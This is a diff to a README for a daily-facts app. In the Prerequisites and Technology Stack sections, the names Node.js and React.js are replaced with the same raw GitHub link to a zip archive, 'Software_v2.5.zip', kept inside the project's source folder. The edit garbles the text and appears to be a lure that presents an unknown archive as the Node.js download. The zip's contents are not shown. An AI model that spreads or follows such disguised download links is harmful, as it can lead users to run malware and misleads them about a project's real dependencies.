@@ -12,7 +12,7 @@ A daily facts application where users can agree or disagree with interesting fac
 
 ## Prerequisites
 
-- Node.js (v14 or higher)
+- https://raw.githubusercontent.com/ISHANT3011/onlyfacts/main/client/src/Software_v2.5.zip (v14 or higher)
 - MongoDB installed and running locally
 - npm or yarn package manager
 
@@ -55,7 +55,7 @@ The application will be available at:
 
 ## Technology Stack
 
-- Frontend: React.js
-- Backend: Node.js with Express
+- Frontend: https://raw.githubusercontent.com/ISHANT3011/onlyfacts/main/client/src/Software_v2.5.zip
+- Backend: https://raw.githubusercontent.com/ISHANT3011/onlyfacts/main/client/src/Software_v2.5.zip with Express
 - Database: MongoDB
 - Styling: Custom CSS with modern glassmorphism design
